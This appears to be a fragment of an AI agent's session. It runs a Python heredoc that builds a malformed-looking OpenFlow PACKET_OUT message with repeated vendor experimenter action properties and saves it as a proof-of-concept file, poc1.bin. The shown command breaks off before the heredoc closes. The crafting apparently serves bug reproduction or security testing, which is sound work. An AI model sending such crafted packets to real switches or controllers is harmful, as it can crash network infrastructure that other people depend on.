Running command: cd /workspace && python3 - <<'PY'
import struct
props = b''.join(struct.pack('!HBBB3x', 4, 1, 5, 1) for _ in range(7))
action_len = 16 + len(props)
action = struct.pack('!HHIHHI', 0xffff, action_len, 0x00002320, 46, 0, 0x0001894f) + props
msg_len = 8 + 16 + len(action)
hdr = struct.pack('!BBHI', 4, 13, msg_len, 0x12345678)
packet_out = struct.pack('!IIH6x', 0xffffffff, 0xfffffffd, len(action))
open('/workspace/poc1.bin','wb').write(hdr+packet_out+action)
print(msg_len, action_len, len(hdr+packet_out+action))
